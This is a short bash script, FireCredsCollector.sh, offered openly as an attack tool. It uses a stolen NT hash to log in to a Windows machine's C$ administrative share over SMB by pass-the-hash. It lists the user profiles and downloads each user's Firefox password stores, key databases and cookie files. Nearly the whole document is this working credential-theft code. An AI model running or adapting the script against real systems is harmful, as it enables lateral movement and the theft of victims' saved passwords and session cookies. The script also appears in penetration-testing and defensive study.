#!/bin/bash
echo -e """    _______           ______              __     ______      ____          __                  __
   / ____(_)_______  / ____/_______  ____/ /____/ ____/___  / / /__  _____/ /_____  __________/ /_ 
  / /_  / / ___/ _ \/ /   / ___/ _ \/ __  / ___/ /   / __ \/ / / _ \/ ___/ __/ __ \/ ___/ ___/ __ \\
 / __/ / / /  /  __/ /___/ /  /  __/ /_/ (__  ) /___/ /_/ / / /  __/ /__/ /_/ /_/ / /  (__  ) / / /
/_/   /_/_/   \___/\____/_/   \___/\__,_/____/\____/\____/_/_/\___/\___/\__/\____/_(_)/____/_/ /_/ v0.1b
                                                              by: \033[32mJuampa Rodríguez (@UnD3sc0n0c1d0)\033[0m"""
if [ -z $1 ]
    then
    echo -e "\n usage: ./FireCredsCollector.sh -t TARGET -d DOMAIN -u USER -h HASH NT\n"
    exit 0
    fi

smbclient \\\\$2\\C$ -U $4/$6%$8 --pw-nt-hash -D Users -c dir &>/dev/null; if [ $? -eq 0 ]; then
    smbclient \\\\$2\\C$ -U $4/$6%$8 --pw-nt-hash -D Users -c dir | egrep -v "DHSrn|DHR|DR|AHS" | grep "D" | sed 's/^[[:space:]]*//' | cut -d " " -f1 > Users.txt
    
    for var1 in $(cat Users.txt);
        do smbclient \\\\$2\\C$ -U $4/$6%$8 --pw-nt-hash -D Users\\$var1\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles -c "dir" | grep -v "blocks of size" | sed 's/^[[:space:]]*//' | cut -d " " -f1 | egrep "release|default" &>/dev/null;
            if [ $? -eq 0 ];
            then var2=$(smbclient \\\\$2\\C$ -U $4/$6%$8 --pw-nt-hash -D Users\\$var1\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles -c "dir" | grep -v "blocks of size" | sed 's/^[[:space:]]*//' | cut -d " " -f1 | egrep "release|default");
            mkdir $2_$var1; cd $2_$var1;
            for var3 in logins.json logins-backup.json cert8.db cert9.db key3.db key4.db signons.sqlite cookies.sqlite;
                do smbclient \\\\$2\\C$ -U $4/$6%$8 --pw-nt-hash -D Users\\$var1\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\$var2 -c "get $var3" &>/dev/null;
                done
                echo -e "\nLocalized files for user\033[34m" $var1"\033[0m:"; tree | grep -v "directories" | tail -n +2;
                cd ..
            fi;
    done
    rm Users.txt   
    else 
        echo -e """\n [\033[31m!\033[0m] \033[31mOops, something went wrong...\033[0m
 [\033[33m?\033[0m] \033[33mAre you sure the TARGET is up?\033[0m
 [\033[31m!\033[0m] \033[31mYou must check the syntax and respect the order of the parameters.\033[0m
  \n usage: ./FireCredsCollector.sh -t TARGET -d DOMAIN -u USER -h HASH NT\n"""
    fi;
